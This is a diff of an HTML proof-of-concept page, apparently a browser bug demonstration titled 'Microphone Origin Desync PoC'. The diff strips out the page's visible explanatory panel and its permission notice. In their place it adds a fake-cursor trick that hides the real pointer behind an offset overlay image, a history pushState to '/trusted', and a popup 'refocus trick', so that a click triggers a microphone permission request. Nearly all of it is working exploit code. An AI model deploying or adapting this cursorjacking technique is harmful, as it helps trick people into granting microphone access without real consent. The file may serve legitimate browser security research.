@@ -2,73 +2,92 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Microphone Origin Desync PoC</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-
 <style>
-body {
-  font-family: system-ui;
-  background:#f5f5f7;
-  margin:0;
+html, body {
+  width: 100%;
+  height: 100%;
+}
+img {
+  pointer-events: none;
+}
+#button {
+  position: absolute;
+  top: 150px;
+  left: 310px;
 }
 #panel {
   display:none;
-  max-width:520px;
-  margin:80px auto;
-  background:#fff;
-  padding:24px;
-  border-radius:16px;
-  box-shadow:0 20px 60px rgba(0,0,0,.2);
-}
-button {
-  width:100%;
-  padding:12px;
-  font-size:16px;
-  border-radius:10px;
-  border:none;
-  background:#007aff;
-  color:#fff;
-}
-.notice {
-  margin-top:12px;
-  font-size:13px;
-  color:#b00020;
 }
 </style>
 </head>
 
 <body>
 
-<div style="text-align:center;margin-top:60px">
-  <button id="trigger">Start PoC</button>
-</div>
-
-<div id="panel">
-  <h2>Trusted Panel</h2>
-  <p>Microphone will be activated after trust-state navigation.</p>
-
-  <button onclick="useMicrophone()">Activate Microphone</button>
-
-  <div class="notice">
-    Demo only — requires user permission
-  </div>
-</div>
+<button id="button">Click here</button>
+<img src="cursor.png" id="cursor" style="display:none">
+<div id="panel"></div>
 
 <script>
-const trigger = document.getElementById('trigger');
-const panel = document.getElementById('panel');
+const cursor = document.getElementById("cursor");
+const button = document.getElementById("button");
+const panel  = document.getElementById("panel");
 
-/* =========================
-   TRUSTED STATE NAVIGATION
-========================= */
-trigger.onclick = () => {
+let fakeCursor = false;
+let lastPos = [0,0];
+
+/* =====================
+   CURSOR HANDLING
+===================== */
+document.addEventListener("mousemove", e => {
+  if (!fakeCursor) {
+    document.body.style.cursor = "auto";
+    cursor.style.display = "none";
+    lastPos = [e.clientX, e.clientY];
+  } else {
+    setFakecursor(e.clientX, e.clientY);
+  }
+});
+
+function setFakecursor(x, y) {
+  cursor.style.display = "block";
+  cursor.style.position = "absolute";
+  cursor.style.top  = y + "px";
+  cursor.style.left = x + "px";
+
+  const cx = Math.max(Math.min(x - 118 - 155, 128), 0);
+  const cy = Math.max(Math.min(y - 128 + 42, 128), 0);
+
+  document.body.style.cursor =
+    `url('overlay.png') ${cx} ${cy}, auto`;
+}
+
+/* =====================
+   CLICK HANDLER
+===================== */
+button.addEventListener("mousedown", e =>
+  setFakecursor(e.clientX, e.clientY)
+);
+
+button.onclick = () => {
+  button.remove();
+  fakeCursor = true;
+  setFakecursor(...lastPos);
+
+  /* 🔥 TRUSTED STATE */
   history.pushState({}, '', '/trusted');
   panel.style.display = 'block';
+
+  /* microphone */
+  useMicrophone(() => fakeCursor = false);
+
+  /* refocus trick */
+  const w = window.open("about:blank", null, "popup");
+  setTimeout(() => w.close(), 100);
 };
 
-/* =========================
+/* =====================
    PAGE LIFECYCLE REDIRECT
-========================= */
+===================== */
 window.addEventListener('pageshow', () => {
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
@@ -79,16 +98,17 @@ window.addEventListener('pageshow', () => {
   });
 });
 
-/* =========================
+/* =====================
    MICROPHONE ONLY
-========================= */
-function useMicrophone() {
-  navigator.mediaDevices.getUserMedia({ audio: true })
-    .then(stream => {
-      const ctx = new AudioContext();
-      const src = ctx.createMediaStreamSource(stream);
-      src.connect(ctx.destination);
-    });
+===================== */
+function useMicrophone(callback) {
+  navigator.mediaDevices.getUserMedia({ audio:true }).then(stream => {
+    callback && callback();
+    const ctx = new AudioContext();
+    const mic = ctx.createMediaStreamSource(stream);
+    mic.connect(ctx.destination);
+    document.body.append("Playing back microphone audio...");
+  });
 }
 </script>
 
